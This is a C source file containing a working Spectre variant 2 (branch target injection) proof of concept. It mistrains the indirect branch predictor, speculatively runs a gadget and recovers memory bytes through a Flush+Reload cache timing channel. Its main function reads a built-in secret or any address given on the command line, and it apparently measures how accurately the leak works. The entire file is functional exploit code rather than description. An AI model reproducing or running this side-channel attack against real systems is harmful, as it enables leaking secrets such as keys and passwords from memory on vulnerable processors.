#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_HIT_THRESHOLD (80)
#define GAP (1024)

uint8_t channel[256 * GAP]; // side channel to extract secret phrase
uint64_t *target; // pointer to indirect call target
char *secret = "The Magic Words are Squeamish Ossifrage.";
// printf("secret_address:%p\n",(void *)secret);

// mistrained target of indirect call
// int gadget(char *addr)
// {
//   return channel[*addr * GAP]; // speculative loads fetch data into the cache
// }
__attribute__((aligned(16384))) 
int gadget(char *addr) {
  return channel[*addr * GAP];
}
// safe target of indirect call
// int safe_target()
// {
//   return 42;
// }
__attribute__((aligned(16384))) 
int safe_target() {
  return 42;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
  int junk = 0;
  // set up branch history buffer (bhb) by performing >29 taken branches
  // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
  //   for details about how the branch prediction mechanism works
  // junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  // call *target
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

void readByte(char *addr_to_read, char result[2], int score[2])
{
  int hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;
  char dummyChar = '$';

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch target predictor
    *target = (uint64_t)&gadget;
    _mm_mfence();
    for (j = 50; j > 0; j--) {
      junk ^= victim(&dummyChar, 0);
    }
    _mm_mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);
    _mm_mfence();

    // change to safe target
    *target = (uint64_t)&safe_target;
    _mm_mfence();

    // flush target to prolong misprediction interval
    _mm_clflush((void*) target);
    _mm_mfence();

    // call victim
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;
      _mm_mfence(); // make sure read completes before we check the timer
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }

  hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}

// int
// main(int argc, char *argv[])
// {
//   target = (uint64_t*)malloc(sizeof(uint64_t));
//   printf("secret_address:%p\n", (void *)secret);
//   char result[2];
//   int score[2];
//   int len = strlen(secret);
//   char *addr = secret;

//   if (argc == 3) {
//     sscanf(argv[1], "%p", (void **)(&addr));
//     sscanf(argv[2], "%d", &len);
//   }

//   printf("Reading %d bytes starting at %p:\n", len, addr);
//   while (--len >= 0) {
//     printf("reading %p...", addr);
//     readByte(addr++, result, score);
//     printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
//     printf("0x%02X='%c'\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
//   }
//   printf("\n");

//   free(target);
//   return 0;
// }
int main(int argc, char *argv[]) {
  target = (uint64_t*)malloc(sizeof(uint64_t));
  printf("secret_address:%p\n", (void *)secret);
  char result[2];
  int score[2];
  int len = strlen(secret);
  char *addr = secret;

  // 新增变量：总字节数和成功次数统计
  int total_bytes = len;
  int success_count = 0;

  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&addr));
    sscanf(argv[2], "%d", &len);
    total_bytes = len;
  }

  printf("Reading %d bytes starting at %p:\n", len, addr);
  while (--len >= 0) {
    char expected = *addr; // 当前待读取字节的预期值
    printf("reading %p...", addr);
    readByte(addr, result, score); // 先读取，再递增addr
    addr++;

    // 检查读取结果是否与预期一致
    if ((unsigned char)result[0] == (unsigned char)expected) {
      success_count++;
      printf("[CORRECT] ");
    } else {
      printf("[WRONG]   ");
    }

    // printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
    printf("Read: 0x%02X='%c', Expected: 0x%02X='%c'\n", 
           (unsigned char)result[0], 
           (result[0] > 31 && result[0] < 127 ? result[0] : '?'),
           (unsigned char)expected,
           (expected > 31 && expected < 127 ? expected : '?'));
  }

  // 计算并打印总成功率
  double success_rate = (double)success_count / total_bytes * 100.0;
  printf("\nTotal Success Rate: %.2f%% (%d/%d)\n", success_rate, success_count, total_bytes);

  free(target);
  return 0;
}